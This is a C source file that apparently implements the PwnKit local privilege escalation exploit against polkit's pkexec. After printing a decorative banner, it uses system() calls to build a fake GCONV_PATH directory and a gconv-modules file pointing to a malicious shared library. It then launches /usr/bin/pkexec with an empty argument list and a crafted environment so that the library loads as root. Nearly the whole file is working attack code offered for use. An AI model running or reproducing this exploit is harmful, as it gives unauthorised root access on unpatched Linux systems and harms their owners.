#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define RED     "\x1b[31m"
#define GREEN   "\x1b[32m"
#define YELLOW  "\x1b[33m"
#define BLUE    "\x1b[34m"
#define MAGENTA "\x1b[35m"
#define CYAN    "\x1b[36m"
#define RESET   "\x1b[0m"



int banner (void)
{
    //BANNER
    printf("         "CYAN"_nnnn_"RESET"      "MAGENTA"*"RESET" "GREEN" Little Pwnkit Joke"RESET"\n");
    printf("        "CYAN"dGGGGMMb"RESET"           "MAGENTA"*"RESET" "GREEN"Made By AgentPathogene"RESET"\n");
    printf("       "CYAN"@p~qp~~qMb"RESET"           "MAGENTA"*"RESET" "GREEN"October 2026"RESET"           \n");
    printf("       "CYAN"M|"RESET""YELLOW"@"RESET""CYAN"||"RESET""YELLOW"@"RESET""CYAN") M|"RESET"           "MAGENTA"*"RESET" "GREEN"No F*** AI code in my payload"RESET"\n");
    printf("       "CYAN"@,----"CYAN".JM|"RESET"           "MAGENTA"*"RESET" "GREEN"Remember your death "RESET"\n");
    printf("       "CYAN"JS^"RESET"\__/  "CYAN"qKL"RESET"         "MAGENTA"*"RESET" "GREEN"Jesus is your only way"RESET"\n");
    printf("      "CYAN"dZP        qKRb"RESET"\n");
    printf("     "CYAN"nFS          qKKb"RESET"\n");
    printf("    "CYAN"fTP            SMMb"RESET"\n");
    printf("    "CYAN"HZM            MMMM"RESET"\n");
    printf("    "CYAN"FqM            MMMM"RESET"\n");
    printf("  __"YELLOW"| '.        |"RESET""CYAN"dS'qML"RESET"\n");
    printf(" "YELLOW"|    `.       | `' -"RESET""CYAN"Zq"RESET"\n");
    printf(" "YELLOW")      '"RESET""CYAN".___.,"RESET""YELLOW"|     .'"RESET"\n");
    printf(""YELLOW"\ ___   )"RESET""CYAN"MMMMMM"RESET""YELLOW"|   .'"RESET"\n");
    printf("      "YELLOW"`-'       `--'"RESET"\n");
    printf("");
    printf("");
}

int built_env (void)
{

    system("mkdir -p 'GCONV_PATH=.' && touch 'GCONV_PATH=./ascii' && chmod +x 'GCONV_PATH=./ascii'");
    system("mkdir -p ascii");
    system("cp ~/ascii.so ascii/ascii.so");

}

int backdooring_gconv_mmodules (void)
{
    system("echo 'module UTF-8// PKEXEC// ascii 1' > ascii/gconv-modules");

}


int main (void)
{

    banner();
    built_env();
    backdooring_gconv_mmodules();

    char *arg[] = {NULL};
    char *env[] = {
        "ascii",
        "PATH=GCONV_PATH=.",
        "CHARSET=pkexec",   
        "SHELL=pkexec", 
        NULL
    };

    execve("/usr/bin/pkexec",arg,env);



    return 0;
}